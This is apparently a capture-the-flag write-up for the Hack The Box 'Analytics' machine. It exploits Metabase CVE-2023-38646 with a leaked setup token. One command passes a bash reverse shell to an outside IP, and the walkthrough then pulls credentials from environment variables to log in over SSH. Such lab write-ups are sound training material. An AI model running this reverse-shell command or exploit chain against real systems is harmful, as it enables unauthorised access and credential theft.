                                               Analytics HTB writeup

- added ip,domain name to /etc/hosts
- lets do a basic nmap scan, yeah as usual port 80 and port22 is open
- lets go to the website and find for some leads
- and found this subdomain “http://data.analytical.htb/” while clicking the login button
- and heres it we get a metabase login page

after small googling I found out that the metabase login was vulnerable under this CVE “CVE-2023-38646”.

and not long after found this blog “https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/”

- found the setup token in this endpoint /api/session/properties
- I tried to follow this blog and get reverse shell. but Idk why it didn’t work for me eventhough commands are getting executed.
- not long after I found an python exploit which i will link in this repo **”https://github.com/a6ar55/HTB-writeups/blob/main/Analytics/exploit.py”**
- `python3 [exploit.py](http://exploit.py/) -u [http://data.analytical.htb](http://data.analytical.htb/) -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >&/dev/tcp/10.10.14.93/1234 0>&1"`

ran this exploit and listened on port 1234.

and yeahhh got the reverse shell


<img width="649" alt="Screenshot 2023-12-05 at 9 03 19 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/b05500a1-c701-4fd1-8f03-d607949ebf63">


<img width="651" alt="Screenshot 2023-12-05 at 9 03 27 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/63cceca7-46a3-4383-9333-d4002c79e00f">



after a lot of looking around found the username and password in the enviorment variables

<img width="903" alt="Screenshot 2023-12-05 at 9 05 03 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/a59c5f72-c0ca-498f-b91f-b822d55abba1">


and finally sshed to the user machine.

<img width="1004" alt="Screenshot 2023-12-05 at 9 09 40 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/d6913703-fcf7-4178-bde6-1934275068e6">



now whats left, we can just cat the user.txt

<img width="320" alt="Screenshot 2023-12-05 at 9 11 08 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/2287d1b6-43ff-480b-ab84-f749463d0099">

